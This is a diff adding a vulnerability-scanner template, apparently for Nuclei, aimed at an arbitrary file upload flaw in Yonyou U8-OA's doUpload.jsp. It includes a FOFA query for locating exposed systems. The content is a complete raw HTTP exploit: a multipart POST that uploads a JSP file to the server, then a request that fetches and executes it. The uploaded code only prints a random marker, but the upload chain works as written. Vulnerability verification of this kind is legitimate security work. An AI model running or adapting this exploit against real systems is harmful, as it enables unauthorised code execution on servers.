@@ -1,0 +1,53 @@
+id: yonyou_doupload_upload
+info:
+  name: yonyou_doupload_upload
+  author: Xc1Ym
+  severity: critical
+  description: 用友U8-OA 协同工作系统遵循 J2EE 架构,以 JSP 和 JAVA BEAN 技术作为主要的系统实现手段,开发出了工作流、文档、消息提醒和插件接口。用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    fofa-query: title="用友U8-OA"
+    verified: true
+  tags: upload,OA,yonyou,hw,intrusive
+
+variables:
+  payload: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 219
+        Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75
+
+        --7b1db34fff56ef636e9a5cebcd6c9a75
+        Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("{{payload}}"); %>
+        --7b1db34fff56ef636e9a5cebcd6c9a75--
+      - |
+        GET /yyoa/portal/upload/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: filename
+        regex:
+        - '\d{13}\.jsp'
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "status_code_2==200"
+          - "contains(body_2, '{{payload}}')"
+# digest: 4a0a00473045022029e96f82cac7b76437156cd13ae6c43a0b5bb43395ef74f7fc7c1eb099b75828022100ad0fe13c4053badc011aff5ba981be3bea160f27de17c426e71ada0ee4aa9282:6b2dd5af372f02ed15a56faf8ad98cf9
